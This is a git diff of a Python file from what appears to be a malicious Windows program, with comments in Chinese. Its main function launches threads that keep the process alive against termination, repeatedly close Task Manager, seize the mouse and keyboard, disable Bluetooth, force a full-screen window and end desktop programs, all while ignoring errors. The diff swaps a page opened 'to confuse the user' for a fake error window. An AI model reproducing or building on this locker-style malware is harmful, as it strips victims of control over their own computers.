@@ -1,18 +1,18 @@
-from threading import Thread # 导入threading模块 用于创建线程
-from time import sleep # 导入time模块 用于延时
+from threading import Thread # 创建线程
+from time import sleep # 延时
 
-from utils.ShowMessage import showMessage # 导入utils.ShowMessage模块 用于显示消息
-from utils.PlayAudio import playAudio, speakText # 导入utils.PlayAudio模块 用于播放音频
-from utils.TaskManager import monitorTaskManager # 导入utils.monitorTaskManager 用于操控任务管理器
-from utils.PermissionControl import controlTaskManager, disableBluetooth # 导入utils.PermissionControl模块 用于权限控制
-from utils.ControlMouseKeys import controlMouseKeys # 导入utils.ControlMouseKeys模块 用于操控鼠标键盘
-from utils.ControlSystem import endDesktopProgram, fullScreenWindow, monitorProcess, openWebPage # 导入utils.ControlSystem模块 用于操控系统
+from utils.ShowMessage import showMessage # 显示消息
+from utils.PlayAudio import playAudio, speakText # 播放音频
+from utils.TaskManager import monitorTaskManager # 操控任务管理器
+from utils.PermissionControl import controlTaskManager, disableBluetooth # 权限操作
+from utils.ControlMouseKeys import controlMouseKeys # 操控鼠标键盘
+from utils.ControlSystem import endDesktopProgram, fullScreenWindow, monitorProcess, errorWindow # 操控系统
 
 
 # 主函数
 def startExecuting():
     try:
-        Thread(target=openWebPage).start() # 打开网页迷惑用户
+        Thread(target=errorWindow).start() # 弹出错误窗口
 
         Thread(target=monitorProcess).start() # 保活进程防止被杀死
         Thread(target=monitorTaskManager).start() # 循环关闭任务管理器
@@ -30,6 +30,4 @@ def startExecuting():
         
         speakText() # 播放提示音
     except: pass # 忽略错误
-
-
 
